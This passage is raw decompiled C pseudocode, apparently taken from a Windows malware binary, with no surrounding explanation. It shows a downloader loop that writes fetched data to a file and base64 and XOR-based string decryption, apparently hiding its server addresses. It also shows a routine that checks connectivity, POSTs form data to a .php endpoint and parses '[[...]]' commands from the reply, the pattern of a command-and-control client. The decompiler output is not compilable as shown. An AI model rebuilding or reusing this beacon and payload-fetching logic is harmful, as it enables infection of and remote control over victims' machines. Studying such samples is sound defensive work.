    int32_t * v19 = (int32_t *)v18; // 0x4099a7
    *v19 = v1;
    int32_t * v20 = (int32_t *)(v12 - 40);
    *v20 = v9;
    int32_t * v21 = (int32_t *)(v12 - 44);
    *v21 = v14 + v10;
    _memcpy2();
    *v13 = 0;
    *v15 = (int32_t)&v2;
    *v16 = v1;
    *v17 = v9;
    *v19 = 0;
    WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
    *v20 = v11;
    _free(&g32);
    v10 += v1;
    while (v1 != 0) {
        // 0x409970
        v11 = v14;
        v12 = v18;
        *(int32_t *)(v12 - 4) = (int32_t)&v1;
        *(int32_t *)(v12 - 8) = 0x2710;
        *(int32_t *)(v12 - 12) = v9;
        *(int32_t *)(v12 - 16) = v7;
        InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
        v13 = (int32_t *)(v12 - 20);
        *v13 = v1 + v10;
        v14 = _3f__3f_2_40_YAPAXI_40_Z((int32_t)&g32);
        v15 = (int32_t *)(v12 - 24);
        *v15 = v10;
        v16 = (int32_t *)(v12 - 28);
        *v16 = v11;
        v17 = (int32_t *)(v12 - 32);
        *v17 = v14;
        _memcpy2();
        v18 = v12 - 36;
        v19 = (int32_t *)v18;
        *v19 = v1;
        v20 = (int32_t *)(v12 - 40);
        *v20 = v9;
        v21 = (int32_t *)(v12 - 44);
        *v21 = v14 + v10;
        _memcpy2();
        *v13 = 0;
        *v15 = (int32_t)&v2;
        *v16 = v1;
        *v17 = v9;
        *v19 = 0;
        WriteFile(&g32, &g32, (int32_t)&g32, &g32, (struct _OVERLAPPED *)&g32);
        *v20 = v11;
        _free(&g32);
        v10 += v1;
    }
    // 0x409a02
    *v20 = v7;
    InternetCloseHandle((int32_t *)v14);
    *v21 = v4;
    InternetCloseHandle(&g32);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409a30 - 0x409ae9
int32_t function_409a30(void) {
    int32_t v1; // 0x409a30
    int32_t v2 = v1;
    v1 = v2 + 1;
    // 0x409a30
    while (*(char *)v2 != 0) {
        // 0x409a41
        v2 = v1;
        v1 = v2 + 1;
    }
    // 0x409a48
    int32_t v3; // 0x409a30
    int32_t v4 = v2 - v3; // 0x409a48
    int32_t v5 = (v4 - (v4 >> 31)) / 2; // 0x409a56
    int32_t * v6 = _malloc(v5); // 0x409a59
    int32_t result = (int32_t)v6; // 0x409a59
    _memset(v6, 0, v5);
    if (v4 < 1) {
        // 0x409ad7
        return result;
    }
    int32_t v7 = v3 + 1;
    int32_t v8 = 0; // 0x409acf
    int32_t v9 = 0; // 0x409a30
    while (true) {
        int32_t v10 = v9;
        int32_t v11 = v8;
        int32_t v12 = v11; // 0x409a7c
        v9 = v10;
        if (*(char *)(v11 + v3) == 91) {
            // 0x409a7e
            v12 = v11;
            v9 = v10;
            if (*(char *)(v11 + v7) == 91) {
                int32_t v13 = v11 + 2; // 0x409a85
                int32_t v14 = v13; // 0x409a8c
                int32_t v15 = 0; // 0x409a8c
                int32_t v16 = v10; // 0x409a8c
                v12 = v11;
                v9 = v10;
                if (v13 < v4) {
                    int32_t v17; // 0x409a30
                    int32_t v18; // 0x409a30
                    while (true) {
                        // 0x409a90
                        v18 = v16;
                        int32_t v19 = v15;
                        v17 = v14;
                        char v20 = *(char *)(v17 + v3); // 0x409a90
                        if (v20 == 93) {
                            // 0x409a98
                            if (*(char *)(v17 + v7) == v20) {
                                // break -> 0x409ae1
                                break;
                            }
                        }
                        int32_t v21 = v19 + 1; // 0x409a9e
                        int32_t v22 = v18; // 0x409aa1
                        if (v21 >= 1) {
                            uint64_t v23 = 0x55555556 * (int64_t)v21; // 0x409aa8
                            v22 = v18;
                            if (v21 == 3 * ((int32_t)(v23 / 0x8000000000000000) + (int32_t)(v23 / 0x100000000))) {
                                // 0x409abd
                                *(char *)(v18 + result) = v20;
                                v22 = v18 + 1;
                            }
                        }
                        int32_t v24 = v17 + 1; // 0x409ac7
                        v14 = v24;
                        v15 = v21;
                        v16 = v22;
                        v12 = v11;
                        v9 = v22;
                        if (v24 >= v4) {
                            goto lab_0x409acf;
                        }
                    }
                    // 0x409ae1
                    v12 = v17 + 1;
                    v9 = v18;
                }
            }
        }
      lab_0x409acf:
        // 0x409acf
        v8 = v12 + 1;
        if (v8 >= v4) {
            // break -> 0x409ad7
            break;
        }
    }
    // 0x409ad7
    return result;
}

// Address range: 0x409af0 - 0x409cea
int32_t function_409af0(void) {
    // 0x409af0
    int32_t v1; // 0x409af0
    if (v1 == 0 || (char)v1 == 0) {
        // 0x409ce3
        return 0;
    }
    char * lpString = (char *)v1; // 0x409b13
    int32_t * memoryHandle = LocalAlloc(64, lstrlenA(lpString) + 1); // 0x409b21
    int32_t v2 = (int32_t)memoryHandle; // 0x409b21
    char v3 = *lpString; // 0x409b68
    int32_t v4 = 0;
    int32_t v5; // 0x409af0
    while (true) {
      lab_0x409b34:;
        int32_t v6 = v4;
        char v7 = v3; // 0x409b34
        if ((v7 & -33) < 91) {
            // 0x409b63
            *(char *)(v6 + v2) = v7;
            v5 = v6 + 1;
            goto lab_0x409b67;
        } else {
            // 0x409b4a
            v5 = v6;
            if (v7 != 61 == v7 > 57 == ((v7 || 4) != 47)) {
                goto lab_0x409b67;
            } else {
                // 0x409b63
                *(char *)(v6 + v2) = v7;
                v5 = v6 + 1;
                goto lab_0x409b67;
            }
        }
    }
  lab_0x409b70:;
    int32_t v8; // 0x409af0
    if (v4 < 1) {
        // 0x409cd0
        LocalFree(memoryHandle);
        int32_t v9; // 0x409af0
        return v9 - v8;
    }
    char * v10 = (char *)v8; // 0x409af0
    int32_t v11 = 0;
    char v12 = *(char *)(v11 + v2); // 0x409b80
    int32_t v13 = v11 | 1; // 0x409b83
    int32_t v14; // 0x409af0
    int32_t v15 = v14 & -0x10000; // 0x409b86
    int32_t v16 = v15 | 0x4141; // 0x409b8e
    if (v13 < v4) {
        // 0x409b90
        v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
    }
    int32_t v17 = v16; // 0x409b9e
    int32_t v18 = v17; // 0x409b99
    if (v13 + 1 < v4) {
        // 0x409b9b
        v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
    }
    int32_t v19 = v18;
    int32_t v20 = v11 | 3; // 0x409ba2
    int32_t v21 = 0x4100; // 0x409ba7
    if (v20 < v4) {
        // 0x409ba9
        v21 = 256 * (int32_t)*(char *)(v20 + v2);
    }
    uint32_t v22 = v21;
    unsigned char v23 = v12 - 65; // 0x409bb2
    int32_t v24; // 0x409af0
    if (v23 < 26) {
        // 0x409bb8
        v24 = v23;
    } else {
        if (v12 < 123) {
            // 0x409bc5
            v24 = v12 - 71;
        } else {
            if (v12 < 58) {
                // 0x409bd2
                v24 = v12 + 4;
            } else {
                // 0x409bd7
                v24 = v12 != 43 ? 63 : 62;
            }
        }
    }
    char v25 = v19;
    int32_t v26; // 0x409af0
    int32_t v27; // 0x409be8
    int32_t v28; // 0x409bf5
    int32_t v29; // 0x409c02
    int32_t v30; // 0x409c0d
    if (v25 < 91) {
        // 0x409be8
        v27 = v19 + 191 & 255 | v19 & -256;
        v14 = v27;
        v26 = v27;
    } else {
        if (v25 < 123) {
            // 0x409bf5
            v28 = v19 + 185 & 255 | v19 & -256;
            v14 = v28;
            v26 = v28;
        } else {
            if (v25 < 58) {
                // 0x409c02
                v29 = v19 + 4 & 255 | v19 & -256;
                v14 = v29;
                v26 = v29;
            } else {
                // 0x409c07
                v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                v14 = v30;
                v26 = v30;
            }
        }
    }
    uint32_t v31 = v26 / 256; // 0x409c10
    char v32 = v31;
    int32_t v33; // 0x409af0
    if (v32 < 91) {
        // 0x409c18
        v33 = v31 + 191 & 255;
    } else {
        if (v32 < 123) {
            // 0x409c27
            v33 = v31 + 185 & 255;
        } else {
            if (v32 < 58) {
                // 0x409c36
                v33 = v31 + 4 & 255;
            } else {
                // 0x409c3d
                v33 = v32 != 43 ? 63 : 62;
            }
        }
    }
    int32_t v34 = v24 | v22;
    uint32_t v35 = v33;
    char v36 = v22 / 256;
    int32_t v37; // 0x409af0
    if (v36 < 91) {
        // 0x409c4e
        v37 = v34 + 0xbf00 & 0xff00;
    } else {
        if (v36 < 123) {
            // 0x409c5d
            v37 = v34 + 0xb900 & 0xff00;
        } else {
            if (v36 < 58) {
                // 0x409c6c
                v37 = v34 + 1024 & 0xff00;
            } else {
                // 0x409c73
                v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
            }
        }
    }
    int32_t v38 = v37;
    int32_t v39 = (int32_t)v10; // 0x409c7c
    int32_t v40 = v26 / 16 & 15 | 4 * v34 & 252; // 0x409c87
    *v10 = (char)v40;
    int32_t v41 = v39 + 1; // 0x409c8b
    char * v42 = (char *)v41; // 0x409c8c
    int32_t v43 = v14; // 0x409c92
    int32_t v44; // 0x409af0
    int32_t v45; // 0x409af0
    char * v46; // 0x409af0
    int32_t v47; // 0x409c9f
    int32_t v48; // 0x409ca6
    if ((v43 & 0xff00) == 0x3d00) {
        // 0x409cac
        v14 = v41;
        v45 = v41;
        v46 = v42;
        v44 = v40;
    } else {
        // 0x409c97
        v47 = 16 * v43 & 240 | v35 / 4;
        *v42 = (char)v47;
        v48 = v39 + 2;
        v14 = v48;
        v45 = v48;
        v46 = (char *)v48;
        v44 = v47;
    }
    int32_t v49 = v45; // 0x409cb9
    int32_t v50 = v49; // 0x409cb2
    char * v51 = v46; // 0x409cb2
    if ((v22 & 0xff00) != 0x3d00) {
        // 0x409cb4
        *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
        v50 = v14 + 1;
        v51 = (char *)v50;
    }
    char * v52 = v51;
    int32_t v53 = v11 + 4; // 0x409cc2
    v10 = v52;
    while (v53 < v4) {
        // 0x409b80
        v11 = v53;
        v12 = *(char *)(v11 + v2);
        v13 = v11 | 1;
        v15 = v50 & -0x10000;
        v16 = v15 | 0x4141;
        if (v13 < v4) {
            // 0x409b90
            v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
        }
        // 0x409b94
        v17 = v16;
        v18 = v17;
        if (v13 + 1 < v4) {
            // 0x409b9b
            v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
        }
        // 0x409ba2
        v19 = v18;
        v20 = v11 | 3;
        v21 = 0x4100;
        if (v20 < v4) {
            // 0x409ba9
            v21 = 256 * (int32_t)*(char *)(v20 + v2);
        }
        // 0x409bb0
        v22 = v21;
        v23 = v12 - 65;
        if (v23 < 26) {
            // 0x409bb8
            v24 = v23;
        } else {
            if (v12 < 123) {
                // 0x409bc5
                v24 = v12 - 71;
            } else {
                if (v12 < 58) {
                    // 0x409bd2
                    v24 = v12 + 4;
                } else {
                    // 0x409bd7
                    v24 = v12 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409be0
        v25 = v19;
        if (v25 < 91) {
            // 0x409be8
            v27 = v19 + 191 & 255 | v19 & -256;
            v14 = v27;
            v26 = v27;
        } else {
            if (v25 < 123) {
                // 0x409bf5
                v28 = v19 + 185 & 255 | v19 & -256;
                v14 = v28;
                v26 = v28;
            } else {
                if (v25 < 58) {
                    // 0x409c02
                    v29 = v19 + 4 & 255 | v19 & -256;
                    v14 = v29;
                    v26 = v29;
                } else {
                    // 0x409c07
                    v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                    v14 = v30;
                    v26 = v30;
                }
            }
        }
        // 0x409c10
        v31 = v26 / 256;
        v32 = v31;
        if (v32 < 91) {
            // 0x409c18
            v33 = v31 + 191 & 255;
        } else {
            if (v32 < 123) {
                // 0x409c27
                v33 = v31 + 185 & 255;
            } else {
                if (v32 < 58) {
                    // 0x409c36
                    v33 = v31 + 4 & 255;
                } else {
                    // 0x409c3d
                    v33 = v32 != 43 ? 63 : 62;
                }
            }
        }
        // 0x409c46
        v34 = v24 | v22;
        v35 = v33;
        v36 = v22 / 256;
        if (v36 < 91) {
            // 0x409c4e
            v37 = v34 + 0xbf00 & 0xff00;
        } else {
            if (v36 < 123) {
                // 0x409c5d
                v37 = v34 + 0xb900 & 0xff00;
            } else {
                if (v36 < 58) {
                    // 0x409c6c
                    v37 = v34 + 1024 & 0xff00;
                } else {
                    // 0x409c73
                    v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
                }
            }
        }
        // 0x409c7c
        v38 = v37;
        v39 = (int32_t)v10;
        v40 = v26 / 16 & 15 | 4 * v34 & 252;
        *v10 = (char)v40;
        v41 = v39 + 1;
        v42 = (char *)v41;
        v43 = v14;
        if ((v43 & 0xff00) == 0x3d00) {
            // 0x409cac
            v14 = v41;
            v45 = v41;
            v46 = v42;
            v44 = v40;
        } else {
            // 0x409c97
            v47 = 16 * v43 & 240 | v35 / 4;
            *v42 = (char)v47;
            v48 = v39 + 2;
            v14 = v48;
            v45 = v48;
            v46 = (char *)v48;
            v44 = v47;
        }
        // 0x409caf
        v49 = v45;
        v50 = v49;
        v51 = v46;
        if ((v22 & 0xff00) != 0x3d00) {
            // 0x409cb4
            *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
            v50 = v14 + 1;
            v51 = (char *)v50;
        }
        // 0x409cbf
        v52 = v51;
        v53 = v11 + 4;
        v10 = v52;
    }
    // 0x409cd0
    LocalFree(memoryHandle);
    return (int32_t)v52 - v8;
  lab_0x409b67:
    // 0x409b67
    v4 = v5;
    int32_t v54; // 0x409af0
    int32_t v55 = v54 + 1; // 0x409b67
    v3 = *(char *)v55;
    v54 = v55;
    if (v3 == 0) {
        // break -> 0x409b70
        goto lab_0x409b70;
    }
    goto lab_0x409b34;
}

// Address range: 0x409cf0 - 0x409da0
int32_t function_409cf0(void) {
    // 0x409cf0
    int32_t lpString; // 0x409cf0
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)lpString)); // 0x409cff
    int32_t v1 = function_409af0(); // 0x409d0b
    int32_t v2 = v1 - (v1 >> 31); // 0x409d16
    if (v2 < 2) {
        // 0x409d9a
        return memoryHandle;
    }
    int32_t v3 = 0; // 0x409d1c
    int32_t v4 = 2 * v3 + memoryHandle;
    char v5 = *(char *)v4; // 0x409d20
    char v6 = v5 - 48; // 0x409d23
    char v7 = v6; // 0x409d28
    if (v6 >= 10) {
        if (v5 < 71) {
            // 0x409d39
            v7 = v5 - 55;
        } else {
            // 0x409d41
            v7 = v5 < 103 ? v5 - 87 : 0;
        }
    }
    char v8 = *(char *)(v4 + 1); // 0x409d52
    char v9 = v8 - 48; // 0x409d56
    char v10 = v9; // 0x409d5c
    if (v9 >= 10) {
        if (v8 < 71) {
            // 0x409d6e
            v10 = v8 - 55;
        } else {
            // 0x409d76
            v10 = v8 < 103 ? v8 - 87 : 0;
        }
    }
    unsigned char v11 = v10 + 16 * v7 ^ 35; // 0x409d8f
    *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
    v3++;
    while (v3 != v2 / 2) {
        // 0x409d20
        v4 = 2 * v3 + memoryHandle;
        v5 = *(char *)v4;
        v6 = v5 - 48;
        v7 = v6;
        if (v6 >= 10) {
            if (v5 < 71) {
                // 0x409d39
                v7 = v5 - 55;
            } else {
                // 0x409d41
                v7 = v5 < 103 ? v5 - 87 : 0;
            }
        }
        // 0x409d52
        v8 = *(char *)(v4 + 1);
        v9 = v8 - 48;
        v10 = v9;
        if (v9 >= 10) {
            if (v8 < 71) {
                // 0x409d6e
                v10 = v8 - 55;
            } else {
                // 0x409d76
                v10 = v8 < 103 ? v8 - 87 : 0;
            }
        }
        // 0x409d88
        v11 = v10 + 16 * v7 ^ 35;
        *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
        v3++;
    }
    // 0x409d9a
    return memoryHandle;
}

// Address range: 0x409da0 - 0x409fa1
int32_t function_409da0(void) {
    // 0x409da0
    __chkstk();
    int32_t v1; // 0x409da0
    _printf((char *)v1);
    int32_t v2; // 0x409da0
    int32_t v3 = v2;
    v2 = v3 + 1;
    while (*(char *)v3 != 0) {
        // 0x409dd5
        v3 = v2;
        v2 = v3 + 1;
    }
    // 0x409ddc
    int32_t v4; // bp-1196, 0x409da0
    int16_t * v5 = (int16_t *)&v4; // bp-28, 0x409de9
    int32_t v6; // 0x409da0
    _mbstowcs((int16_t *)&v4, (char *)v6, 1 - v6 + v3);
    if (function_4098f0() == 0) {
        // 0x409f90
        return _40___security_check_cookie_40_4();
    }
    int32_t v7 = function_409a30(); // 0x409e07
    int32_t v8 = v7; // 0x409e10
    while (*(char *)v8 != 0) {
        // 0x409e13
        v8++;
    }
    int32_t v9 = v8 - v7; // 0x409e1a
    int32_t * v10 = _malloc(v9 + 1); // 0x409e20
    v5 = (int16_t *)v7;
    _strncpy((char *)v10, (char *)v7, v9);
    *(char *)(v9 + (int32_t)v10) = 0;
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)function_409cf0())); // 0x409e49
    function_409af0();
    v5 = (int16_t *)-0x78695a4c;
    int32_t * v11 = NULL; // bp-196, 0x409e98
    _memset(NULL, (int32_t)&g32, (int32_t)&g32);
    function_406d30();
    int32_t v12 = memoryHandle; // 0x409ebd
    while (*(char *)v12 != 0) {
        // 0x409ec0
        v12++;
    }
    int32_t v13 = v12 - memoryHandle; // 0x409ec7
    int32_t v14 = v13 & -0x7ffffff9; // 0x409ecb
    int32_t v15; // 0x409da0
    if (v14 >= 0) {
        // 0x409ed8
        v15 = v13;
        if (v14 == 0) {
            goto lab_0x409eec;
        } else {
            // 0x409eda
            v15 = v13 + 8 + (v13 >> 31 & 7) & -8;
            goto lab_0x409eec;
        }
    } else {
        // 0x409ed3
        v15 = v13;
        if ((v13 + 7 & 7) == 7) {
            goto lab_0x409eec;
        } else {
            // 0x409eda
            v15 = v13 + 8 + (v13 >> 31 & 7) & -8;
            goto lab_0x409eec;
        }
    }
  lab_0x409eec:;
    int32_t v16 = (int32_t)&v5; // 0x409eb7
    int32_t * v17; // 0x409da0
    if (v15 < 1) {
        // 0x409eec
        v17 = (int32_t *)(v16 - 4);
    } else {
        int32_t * v18 = (int32_t *)(v16 - 4);
        int32_t v19 = (v15 - 1) / 8 + 1; // 0x409f04
        int32_t v20; // bp-5364, 0x409da0
        *v18 = (int32_t)&v20;
        function_4068d0((int32_t)&g32);
        v19--;
        v17 = v18;
        while (v19 != 0) {
            // 0x409f05
            *v18 = (int32_t)&v20;
            function_4068d0((int32_t)&g32);
            v19--;
            v17 = v18;
        }
    }
    // 0x409f25
    *v17 = (int32_t)"http://";
    int32_t v21 = (int32_t)&v11; // 0x409f36
    *(int32_t *)(v16 - 8) = v21;
    char * v22 = StrStrIA((char *)&g32, (char *)&g32); // 0x409f37
    int32_t v23; // bp-189, 0x409da0
    int32_t v24 = v22 == NULL ? v21 : (int32_t)&v23; // 0x409f47
    *(int32_t *)(v16 - 12) = (int32_t)"https://";
    *(int32_t *)(v16 - 16) = v24;
    int32_t v25 = StrStrIA((char *)&g32, (char *)&g32) == NULL ? v24 : v24 + 8;
    char v26 = *(char *)v25; // 0x409f59
    int32_t v27 = 0; // 0x409f65
    if (v26 != 47) {
        char v28 = v26; // 0x409f6b
        int32_t v29 = 0; // 0x409f6b
        int32_t v30 = v25; // 0x409f6b
        v27 = v29;
        while (v28 != 0) {
            // 0x409f74
            *(char *)(v1 - v25 + v30) = v28;
            v29++;
            v30++;
            v28 = *(char *)v30;
            v27 = v29;
            if (v28 == 47) {
                // break -> 0x409f80
                break;
            }
            v27 = v29;
        }
    }
    // 0x409f80
    *(int32_t *)(v16 - 20) = memoryHandle;
    *(char *)(v27 + v1) = 0;
    LocalFree(&g32);
    // 0x409f90
    return _40___security_check_cookie_40_4();
}

// Address range: 0x409fb0 - 0x40a21f
int32_t function_409fb0(int32_t a1, int32_t * a2, int32_t a3) {
    int32_t v1 = 0x54534f50; // bp-20, 0x409fc8
    __asm_rep_stosd_memset((char *)a1, 0, 0x88b8);
    int32_t v2; // bp-144, 0x409fb0
    if (!InternetGetConnectedState(&v2, (int32_t)&g32)) {
        // 0x40a209
        return _40___security_check_cookie_40_4();
    }
    // 0x409fff
    int32_t v3; // 0x409fb0
    int32_t * v4 = InternetConnectA((int32_t *)g30, (char *)v3, 80, NULL, NULL, 3, 0, 1); // 0x40a012
    if (v4 == NULL) {
        // 0x40a01f
        return _40___security_check_cookie_40_4();
    }
    // 0x40a032
    int128_t v5; // 0x409fb0
    __asm_movdqu_10(v5, __asm_movdqa(0x7061203a657079542d746e65746e6f43));
    int128_t v6; // 0x409fb0
    __asm_movdqu_10(v6, __asm_movdqa(g11));
    int128_t v7; // 0x409fb0
    __asm_movdqu_10(v7, __asm_movdqa(0x6465646f636e656c72752d6d726f66));
    int32_t * memoryHandle = LocalAlloc((int32_t)&g32, (int32_t)&g32); // 0x40a05d
    int32_t v8 = (int32_t)memoryHandle; // bp-128, 0x40a063
    int32_t v9; // 0x409fb0
    char * lpString = (char *)v9; // bp-208, 0x40a071
    int32_t v10 = (int32_t)&lpString; // 0x40a071
    *(char *)memoryHandle = 97;
    *(char *)(v8 + 1) = 112;
    *(char *)(v8 + 2) = 112;
    *(char *)(v8 + 3) = 108;
    *(char *)(v8 + 4) = 105;
    *(char *)(v8 + 5) = 99;
    *(char *)(v8 + 6) = 97;
    *(char *)(v8 + 7) = 116;
    *(char *)(v8 + 8) = 105;
    *(char *)(v8 + 9) = 111;
    *(char *)(v8 + 10) = 110;
    *(char *)(v8 + 11) = 47;
    *(char *)(v8 + 12) = 120;
    *(char *)(v8 + 13) = 45;
    *(char *)(v8 + 14) = 119;
    *(char *)(v8 + 15) = 119;
    *(char *)(v8 + 16) = 119;
    *(char *)(v8 + 17) = 45;
    *(char *)(v8 + 18) = 102;
    *(char *)(v8 + 19) = 111;
    *(char *)(v8 + 20) = 114;
    *(char *)(v8 + 21) = 109;
    *(char *)(v8 + 22) = 45;
    *(char *)(v8 + 23) = 117;
    *(char *)(v8 + 24) = 114;
    *(char *)(v8 + 25) = 108;
    *(char *)(v8 + 26) = 101;
    *(char *)(v8 + 27) = 110;
    *(char *)(v8 + 28) = 99;
    *(char *)(v8 + 29) = 111;
    *(char *)(v8 + 30) = 100;
    *(char *)(v8 + 31) = 101;
    *(char *)(v8 + 32) = 100;
    *(char *)(v8 + 33) = 0;
    int32_t v11 = v10; // 0x40a164
    int32_t v12 = 0; // 0x40a164
    int32_t v13 = v10; // 0x40a164
    int32_t v14 = 0; // 0x40a164
    if (lstrlenA(lpString) >= 1) {
        int32_t v15 = 0;
        int32_t v16 = v12 + v9;
        int32_t v17 = v15; // 0x40a16a
        if (*(char *)v16 == 46) {
            // 0x40a16c
            v17 = v15;
            if (*(char *)(v16 + 1) == 112) {
                // 0x40a173
                v17 = v15;
                if (*(char *)(v16 + 2) == 104) {
                    // 0x40a17a
                    v17 = v15;
                    if (*(char *)(v16 + 3) == 112) {
                        // 0x40a181
                        *(char *)(v16 + 4) = 0;
                        v17 = v16 + 5;
                    }
                }
            }
        }
        int32_t v18 = v17;
        v11 -= 4;
        v12++;
        uint32_t v19 = lstrlenA((char *)&g32); // 0x40a18d
        v13 = v11;
        v14 = v18;
        while (v12 < v19) {
            // 0x40a166
            v15 = v18;
            v16 = v12 + v9;
            v17 = v15;
            if (*(char *)v16 == 46) {
                // 0x40a16c
                v17 = v15;
                if (*(char *)(v16 + 1) == 112) {
                    // 0x40a173
                    v17 = v15;
                    if (*(char *)(v16 + 2) == 104) {
                        // 0x40a17a
                        v17 = v15;
                        if (*(char *)(v16 + 3) == 112) {
                            // 0x40a181
                            *(char *)(v16 + 4) = 0;
                            v17 = v16 + 5;
                        }
                    }
                }
            }
            // 0x40a18b
            v18 = v17;
            v11 -= 4;
            v12++;
            v19 = lstrlenA((char *)&g32);
            v13 = v11;
            v14 = v18;
        }
    }
    int32_t v20 = (int32_t)v4; // 0x40a012
    *(int32_t *)(v13 - 4) = 0;
    *(int32_t *)(v13 - 8) = -0x7c000000;
    *(int32_t *)(v13 - 12) = (int32_t)&v8;
    *(int32_t *)(v13 - 16) = 0;
    *(int32_t *)(v13 - 20) = 0;
    *(int32_t *)(v13 - 28) = (int32_t)&v1;
    *(int32_t *)(v13 - 32) = v20;
    int32_t v21 = HttpOpenRequestA(); // 0x40a1ae
    if (v21 == 0) {
        // 0x40a01f
        return _40___security_check_cookie_40_4();
    }
    // 0x40a1be
    int128_t v22; // bp-120, 0x409fb0
    int32_t v23 = &v22; // 0x40a1be
    int32_t v24 = v23; // 0x40a1c1
    while (*(char *)v24 != 0) {
        // 0x40a1c4
        v24++;
    }
    // 0x40a1cb
    *(int32_t *)(v13 - 36) = v14;
    *(int32_t *)(v13 - 40) = lstrlenA((char *)&g32);
    *(int32_t *)(v13 - 44) = v14;
    int32_t v25; // bp-119, 0x409fb0
    *(int32_t *)(v13 - 48) = v24 - (int32_t)&v25;
    *(int32_t *)(v13 - 52) = v23;
    *(int32_t *)(v13 - 56) = v21;
    HttpSendRequestA(&g32, (char *)&g32, (int32_t)&g32, &g32, (int32_t)&g32);
    int32_t v26; // bp-140, 0x409fb0
    *(int32_t *)(v13 - 60) = (int32_t)&v26;
    *(int32_t *)(v13 - 64) = 0x222e0;
    *(int32_t *)(v13 - 68) = a1;
    *(int32_t *)(v13 - 72) = v21;
    InternetReadFile(&g32, &g32, (int32_t)&g32, &g32);
    *(int32_t *)(v13 - 76) = v21;
    InternetCloseHandle(&g32);
    *(int32_t *)(v13 - 80) = v20;
    InternetCloseHandle(&g32);
    // 0x40a209
    return _40___security_check_cookie_40_4();
}

// Address range: 0x40a220 - 0x40a4d0
int32_t function_40a220(void) {
    // 0x40a220
    __chkstk();
    int32_t uFlags; // 0x40a220
    int32_t * memoryHandle = LocalAlloc(uFlags, (int32_t)&g32); // 0x40a249
    int32_t v1; // 0x40a220
    int32_t v2 = StrStrIA((char *)memoryHandle, (char *)&g32) == NULL ? v1 : v1 + 7;
    char * v3 = (char *)v2; // 0x40a26f
    char * v4 = v3; // bp-40, 0x40a26f
    int32_t v5 = StrStrIA(v3, "https://") == NULL ? v2 : v2 + 8;
    unsigned char v6 = *(char *)v5; // 0x40a279
    int32_t v7 = v1 & -256 | (int32_t)v6; // 0x40a279
    int32_t v8 = v7; // 0x40a27f
    int32_t v9 = 0; // 0x40a27f
    int32_t v10; // bp-84, 0x40a220
    if (v6 >= 1) {
        int32_t v11 = (int32_t)&v10 - v5; // 0x40a286
        int32_t v12 = v7; // 0x40a286
        int32_t v13 = v5; // 0x40a286
        int32_t v14 = 0; // 0x40a286
        char v15 = v12; // 0x40a288
        v8 = v12;
        while (v15 != 47) {
            // 0x40a28d
            *(char *)(v11 + v13) = v15;
            v14++;
            v13++;
            unsigned char v16 = *(char *)v13; // 0x40a291
            v12 = v12 & -256 | (int32_t)v16;
            v8 = v12;
            if (v14 >= (int32_t)v16) {
                // break -> 0x40a29c
                break;
            }
            v15 = v12;
            v8 = v12;
        }
        // 0x40a29c
        v9 = v14;
        if (v9 >= 50) {
            // 0x40a4bd
            function_40b2ce();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            __asm_int3();
            return __asm_int3();
        }
    }
    int32_t v17 = (int32_t)memoryHandle; // 0x40a249
    int32_t v18 = v8;
    int32_t v19; // bp-4, 0x40a220
    *(char *)((int32_t)&v19 - 80 + v9) = 0;
    int32_t v20; // bp-140244, 0x40a220
    char * v21 = (char *)&v20; // bp-48, 0x40a2b7
    int32_t v22 = function_409fb0(v18, &v20, v18); // 0x40a2bf
    char ** v23 = &v4; // 0x40a2c9
    int32_t v24; // 0x40a220
    int32_t v25; // 0x40a220
    int32_t * v26; // bp-244, 0x40a220
    int32_t v27; // bp-88, 0x40a220
    if (v22 == 0) {
        goto lab_0x40a492;
    } else {
        // 0x40a2cf
        v21 = (char *)&v20;
        char * v28 = StrStrIA((char *)&v20, "&r=1"); // 0x40a2db
        v25 = (int32_t)&v21;
        if (v28 != NULL) {
            goto lab_0x40a464;
        } else {
            char * v29 = (char *)&v20; // bp-56, 0x40a2f0
            char * v30 = StrStrIA((char *)&v20, "404 Not Found"); // 0x40a2f1
            v23 = &v29;
            if (v30 != NULL) {
                goto lab_0x40a492;
            } else {
                char * v31 = (char *)&v20; // bp-64, 0x40a306
                char * v32 = StrStrIA((char *)&v20, "[["); // 0x40a307
                v23 = &v31;
                if (v32 == NULL) {
                    goto lab_0x40a492;
                } else {
                    char * v33 = (char *)((int32_t)v32 + 2); // 0x40a31b
                    char * v34 = StrStrIA(v33, "]]"); // 0x40a31c
                    char * lpString = v33; // bp-76, 0x40a324
                    *v34 = 0;
                    int32_t v35 = lstrlenA(lpString); // 0x40a328
                    v25 = (int32_t)&lpString;
                    if (v35 == 0) {
                        goto lab_0x40a464;
                    } else {
                        int32_t uBytes = lstrlenA((char *)function_409cf0()); // 0x40a33c
                        v10 = uBytes;
                        v27 = 64;
                        int32_t memoryHandle2 = (int32_t)LocalAlloc(64, uBytes); // 0x40a341
                        function_409af0();
                        v26 = NULL;
                        _memset(NULL, (int32_t)&g32, (int32_t)&g32);
                        function_406d30();
                        int32_t v36 = memoryHandle2;
                        int32_t v37 = v36 + 1; // 0x40a3b5
                        while (*(char *)v36 != 0) {
                            // 0x40a3b0
                            v36 = v37;
                            v37 = v36 + 1;
                        }
                        int32_t v38 = v36 - memoryHandle2; // 0x40a3b7
                        int32_t v39 = v38 & -0x7ffffff9; // 0x40a3bb
                        if (v39 >= 0) {
                            // 0x40a3c8
                            v24 = v38;
                            if (v39 == 0) {
